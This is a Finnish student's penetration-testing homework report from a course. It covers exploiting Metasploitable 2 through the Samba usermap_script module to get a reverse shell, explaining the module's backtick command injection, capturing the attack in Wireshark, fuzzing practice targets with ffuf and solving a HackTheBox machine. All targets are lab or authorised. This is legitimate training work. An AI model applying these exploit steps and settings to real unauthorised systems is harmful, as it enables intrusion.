# [H3 Nuuskija](https://terokarvinen.com/tunkeutumistestaus/#h3-nuuskija)(Karvinen 2024)

## x) Lue ja tiivistä.

### Wireshark tricks (HackTricks 2024)

*(En pystynyt todentamaan Teron mainitsemaa tietolähteen kirjoittajaa (Popov) linkatusta verkkosivusta.)*

- Tiedon analysointiin paljon toimintoja, mm.:
  - Resolved Addresses, valmistaja MAC-osoitteesta
  - Protocol Hierarchy, Conversations, DNS Info, grafiikoita...
- Laajat filteröinti ja hakutoiminnot (haku pakettien sisällöstä)
- Domain ja local hostnimet
- TLS purkaminen
- ADB kommunikointi (android debug bridge)
  - Nappaa APK (android package)

### Find Hidden Web Directories - Fuzz URLs with ffuf (Karvinen 2023)

- ffufilla voi fuzzata tehokkaasti verkkopyyntöjen hakemistopolkuja, pyyntöheadereitä ym.
  - fuzz = puppua/sotkua, eli testataan mitä tapahtuu kun parametriksi asetetaan satunnaisarvoja
- hakemistojen etsiminen: ``ffuf -w <sanalista> -u <url>/FUZZ``
- sanalistat voi laatia itse tai käyttää olemassa olevia
- filteröi ei-halutut OK 200 vastaukset koon mukaan (``-fs``)

## a) Valitse valmis hyökkäys. Ota sellainen hyökkäys, jonka saat toimimaan omaan paikalliseen harjoitusmaaliin, kuten Metasploitableen. Demonstroi hyökkäyksen toiminta.

**Ensiksi:**

Käynnistin Kalin (hyökkäyskone) ja Metasploitable 2:n (kohdekone) VirtualBoxissa. Testasin yhteyden Kalista kohteeseen ``ping 192.168.56.101`` ja ettei Kali saa ulkoverkkoon yhteyttä ``ping 8.8.8.8``. Sain yhteyden ulkoverkkoon, joten "vedin" kaapelin irti VirtualBox Kali Settings -> Network -> NAT Adapter "Cable Connected" -valinta pois. Uusi pingaus Googlen nimipalvelimille ja voi taas jatkaa.

    sudo msfconsole

Yritin etsiä sopivia exploitteja msfconsolessa ja toistaa edellisen viikon vsftpd-haavoittuvuuden hyväksikäyttökaavaa: search, use, info/show options, set, exploit. En ole vielä ainakaan niin harjaantunut Metasploitin käyttäjä, että kykenisin löytämään sopivia hyökkäyksiä kohteeseen ainoastaan lukemalla kuvaukset. Myöskään sokkona hyökkäyksen testaaminen tuntuu järjenvastaiselta. Jos sokkotestauksen automatisoisi, voisi se mahdollisesti olla hyvä tapa.

![image](https://github.com/user-attachments/assets/c21509ac-19f6-4d77-98b2-817a004f5aa4)
> Kuva 1. Ote Kalin ``history``-tulosteesta tutkittuani muutamia mahdollisia hyökkäysvaihtoehtoja.

Päädyin googlaamaan.

Valitsin services-listauksesta Samban. Muistelin, että siitä oli joko tunnilla esitelty esimerkki tai se tuli vastaan ristiinarvioinnin yhteydessä. Silmäilin [tämän](https://medium.com/@niman.ransindu/exploiting-metasploitable-2-using-samba-9262335fd09d) artikkelin. Artikkelin ohjeet mukailivat tuttua "search, use, set, exploit" -kaavaa. Otin exploitin "multi/samba/usermap_script" käyttöön, katsoin infon ja asetin RHOSTS-muuttujaan kohdekoneen ip:n.

![image](https://github.com/user-attachments/assets/6ca0fffd-5ce8-4307-a038-a289dd488d5a)
> Kuva 2. Epäonnistunut explpoitin ajo ja käytetyt optiot.

LHOSTS oli automaattisesti asetettu NAT-adapterin kytkentään, jonka otin pois käytöstä. Eli ``set LHOSTS <host-only adapter ip>`` ja ``exploit``.

Muutosten jälkeen hyökkäys onnistui ja reverse shell on auki.

Laitoin session taustalle (CTRL + Z) ja päivitin session meterpreter-sessioksi ``sessions -u 1``.

![image](https://github.com/user-attachments/assets/1c0fd514-e057-45a2-bdf1-931b93e052e4)
> Kuva 3. Onnistunut hyökkäys ja session päivitys käyttämään meterpreteriä.

## b) Sorsa. Selitä ja arvioi valitsemasi hyökkäyksen toimintaa lähdekoodista.

![image](https://github.com/user-attachments/assets/5c4c09aa-8ffe-49da-9020-84d4aa843e5a)
> Kuva 4. Hyötykuorman lähdekoodin etsiminen.

Hyötykuormamoduulin nimi tulostuu ``use <exploit>`` komennon yhteydessä, jos sitä ei ole sitä ennen asetettu.

Exploitin lähdekoodi löytyy polusta ``/usr/share/metasploit-framework/modules/exploits/multi/samba/usermap_script.rb``.

Ko. moduuli sisältää ``initialize`` ja ``exploit`` metodit. Metodi ``initialize`` näyttää sisältävän tiedon, joka tulostuu msfconsolessa komennolla ``info``.

![image](https://github.com/user-attachments/assets/f50b415a-befb-4df9-bba9-df9cd746212d)
> Kuva 5. Hyökkäyksen kuvaus lähdekoodista.

![image](https://github.com/user-attachments/assets/0e0e86f2-7ab7-44d1-8957-c6974abc7b8c)
> Kuva 6. # lol?.

Kuvassa 5 on kuvailtu selkokielellä hyökkäyksen kulku. Haavoittuvuus on Samban bugissa, jossa kirjautuvaa käyttäjänimeä ei käsitellä puhtaasti merkkijonona. Shell metamerkkien ` (backquotes) väliin kirjoitettu teksti tulkitaan shell komentona. Kuvassa 6 tämä tapahtuu lähdekoodin rivillä 74, mitä seuraa begin-rescue koodilohkot (try-catch), jossa hyötykuorma koitetaan lähettää kohteeseen. Onnistunut lähetys suorittaa silloin metasploit-frameworkin ``modules/payloads/singles/cmd/unix/reverse_netcat.rb`` koodin.

## c) Snif snif. Selitä ja arvioi valitsemasi hyökkäyksen toimintaa verkkosnifferillä. Pohdi myös, miten näkyvä tämä hyökkäys tai kontrollikanava on verkossa.

Napataan verkkoliikennettä Wiresharkilla. Asennuksen jälkeen poistetaan virtuaalikone Kali ulkoverkosta. Napataan vain Kalin ja Metasploitablen (ja DHCP-palvelimen) välistä verkkoliikennettä.

    sudo apt update
    sudo apt install wireshark
    wireshark

Haineväkuvake käyttöliittymän vasemmassa yläkulmassa File-valikon alla käynnistää verkkopakettien nappaamisen.

![image](https://github.com/user-attachments/assets/6885c954-faed-4b0d-aad2-c53d95371205)
> Kuva 7. Wireshark käynnissä.

Seuraavaksi suoritetaan kohdassa a) dokumentoidut hyökkäystoimenpiteet.

![image](https://github.com/user-attachments/assets/c4aa7dc8-1205-432c-b4a2-7b68592e5044)
> Kuva 8. Hyötykuorman lähetys.

Kuvasta 8 voi nähdä, että ensimmäinen hyötykuorman lähetys (reverse shellin avaaminen) epäonnistui. Minulla oli LHOST-konfiguraatio väärin asetettuna loopback-osoitteeksi (127.0.0.1). Eli kohdekone yritti ottaa yhteyttä väärään socketiin (vrt. kohdat 27 ja 41). Asetin Kalissa msfconsolessa hyökkäyskoneeni kuuntelemaan ``set LHOST 192.168.56.102``.

Hyökkäyksessäni avasin shellin komennolla ``shell`` ja tulostin käytössä olevan kaapatun käyttäjän komennolla ``whoami``. Kokeillaan löytää ne liikennevirrasta.

Wiresharkin tulosteessa toistuu pakettien koot (length). Length-arvoissa toistuu 66 ja 67 tavua. Näistä en löytänyt mielenkiintoista analysoitavaa. Joten näin pienestä datamäärästä pystyn klikkailemaan tallenteet, jotka ovat jotain muuta kuin 66 tai 67 tavua pituudeltaan. Komennon ``whoami`` liikenne ao. kuvassa. Komentoa ``shell`` ei löydy dumpista selkotekstinä. En osaa sanoa miksi näin on.

![image](https://github.com/user-attachments/assets/9d175ee0-a327-4481-aa94-9d469b737501)
> Kuva 9. Ketä mä oon?

Tämänkaltainen hyökkäys on (suhteellisen) helposti havaittavissa. Hälytyskellojen olisi hyvä soida siinä vaiheessa, kun oma tai organisaation kone yrittää ottaa yhteyttä epäilyttävään ts. ei well-known porttiin. Mutta, miten määritellään "epäilyttävä". Toinen asia mikä olisi hyvä havaita on shell-komennot paketin kuormassa (whoami, echo jne.). Tekemäni hyökkäys jätti selvän jäljen tekijästä, ip-osoite ja mac.

![image](https://github.com/user-attachments/assets/35768fb8-68c2-4778-8647-f32b0aece911)
> Kuva 10. Paketin sisältö. Ks. "Ethernet II" -rivi kohta "Dst".

## d) Fuzzzz. Ratkaise dirfuz-1 artikkelista Karvinen 2023: [Find Hidden Web Directories - Fuzz URLs with ffuf](https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/).

Ffuf on tullut Kali-käyttiksen mukana.

![image](https://github.com/user-attachments/assets/b05ddb1a-649f-43c5-82e9-99c77bb59364)
> Kuva 11. Ffuf asennettu.

Asennetaan kohde ja sanalista artikkelin (Karvinen 2023) ohjein sekä käynnistetään paikallinen kohdepalvelin:

    wget https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/dirfuzt-0
    chmod u+x dirfuzt-0
    wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt
    ./dirfuzt-0

![image](https://github.com/user-attachments/assets/0c32b80a-2f5e-4941-ab6d-33eb2f861a02)
> Kuva 12. Kohde ja sanalista asennettu.

![image](https://github.com/user-attachments/assets/0d8ee370-8ffe-4c2d-b150-1bfe993adf27)
> Kuva 13. Toinen ajo. Eka oli ilman -fs (filter size).

![image](https://github.com/user-attachments/assets/19a54dc6-dc0b-4179-a5d2-29fc6c25798a)
> Kuva 14. Admin-sivu löytyi endpointista /admin.

**[EDIT 2024-11-15]**

Hups, korkkasin väärän salaisen hakemiston koneesta ``dirfuzt-0`` enkä tehtävänannossa mainittua ``dirfuzt-1``.

Eli asennetaan oikea kohde

    wget https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/dirfuzt-1
    chmod u+x dirfuzt-1
    ./dirfuzt-1

Tarkoituksena tässä haasteessa on löytää admin-sivu ja versiohallintaan liittyvä sivu.

![image](https://github.com/user-attachments/assets/5249c408-bfcd-4e43-bafe-1b1c914f07c0)
> Kuva 15. Eka ajo. Weppifuzzaus tehtävänannon määrittelemään kohteeseen.

Kuvasta 15 näkee myös paremman tavan dokumentoida ohjelman ajon tuloksia. Kuvassa on hyvä näkyä komento ja tulokset. Jos tuloksia on liikaa näytettäväksi, kannattaa ainakin näyttää osa.

Yllä olevasta kuvasta voi nähdä kahta eri kokoa sekä kahta eri sana- ja rivimäärää. Riveistä, joissa on sanamäärä 6 ja rivejä 11, on fuzzattu polku ollut .git/... . Ehkäpä nämä liittyvät versionhallintaan. Kurkataan mitä näkyy endpointista ``/.git/logs/``.

![image](https://github.com/user-attachments/assets/4cf5a5a0-4c05-4b75-8ee9-fef0bcd15a31)
> Kuva 16. Löytyi versiohallintasalaisuus!

Vielä admin-sivun metsästys. Kokeillaan taas filteröidä koon mukaan. 154 tavua vaikuttaa olevan yleisin vastauskoko, joten filteröidään se pois tuloksista ensin.

![image](https://github.com/user-attachments/assets/469d1dbc-3198-4c11-99c1-9d8272214298)
> Kuva 17. Suodatettu ajo.

![image](https://github.com/user-attachments/assets/301acfb6-a9f8-439e-8535-64fd9672d01a)
> Kuva 18. Admin-sivu löytyi.

**[END EDIT]**

## e) HTB. Ratkaise 1-2 konetta HackTheBoxisssa. Voit valita omaan taitotasoon sopivat koneet.

Ladattuani ``starting_point_username.ovpn`` tiedoston (eurooppalaisilla vaihtoehdoilla) HackTheBoxin sivulta käynnistin sen komennolla ``sudo openvpn Downloads/starting_point_username.ovpn``.

En saanut kuitenkaan muodostettua yhteyttä HackTheBoxin vpn:ään. Sain ilmoitukset terminaalin tulosteeseen ``TLS Error: TLS handshake failed``. Kokeilin ottaa vm:ssäni ainoastaan yhden verkkokytkennän käyttöön (pelkkä NAT), kokeilin .ovpn tiedostolatausta USA-serverille ja asensin uudestaan Kalin tällä kertaa kali.org -sivulta. Eivät toimineet. Muokkaamalla .ovpn tiedostoa [tällä](https://forum.hackthebox.com/t/tls-handshake-failure-during-vpn-connection/3369/11) tavalla sain yhteyden pelaamaan.

**[EDIT 2024-11-15]**

Kurssikaverini Valtteri oli korjannut saman ongelman valitsemalla .ovpn-tiedoston latausvalinnassa "TCP 443". Oletuksena on päällä "UDP 1337"...

Tämä yksinkertaisempi tekniikka myös toimi kohdallani. Testattu samalla koneella, jolla aiemmin sain vpn-yhteyden toimimaan muokkaamalla ladattua tiedostoa.

**[END EDIT]**

![image](https://github.com/user-attachments/assets/e989afe6-90d8-4cca-9382-0575d0a2cd02)
> Kuva 19. Yhteys muodostettu HackTheBoxin StartingPoint vpn:ään.

Nyt kun ympäristö toimii voidaan jatkaa.

**Spawn Machine**

![2024-11-12-spawnmachine](https://github.com/user-attachments/assets/a1bc87dd-fb8f-42de-821a-e924fd179c64)
> Kuva 20. Kohdekone luotu.

**Vastaa kysymyksiin.**

**Korkkaa kone**. Onnistui mukavasti kysymyksistä päättelemällä, että miten otetaan yhteys. Komento ``ls`` ja ``cat flag.txt`` johtivat lipun luokse.

![image](https://github.com/user-attachments/assets/f03ed023-e694-4db6-91a7-a398f0a4d86d)
> Kuva 21. Miau.

Säännöt sallisivat StartingPoint-tehtävien julkaisun. Mutta opettelen hyville HackTheBoxin tavoille jo nyt. StartingPoint-tehtävissä on linkki läpikävelyohjeisiin.

![image](https://github.com/user-attachments/assets/5ceba995-2fed-4df5-a9eb-3f75a8f37cb9)
> Kuva 22. Vasasta ei ollut vastusta.

## Lähteet

HackTricks, 2024. Wireshark Tricks. Luettavissa: https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/wireshark-tricks Luettu: 2024-11-10

Karvinen, T. 2023. Find Hidden Web Directories - Fuzz URLs with ffuf. Luettavissa: https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/ Luettu: 2024-11-12

Karvinen, T. 2024. Find Hidden Web Directories - Fuzz URLs with ffuf. Luettavissa: https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/ Luettu: 2024-11-10

Karvinen, T. 2024. Tunkeutumistestaus. H3 Nuuskija. Luettavissa: https://terokarvinen.com/tunkeutumistestaus/#h3-nuuskija Luettu: 2024-11-10
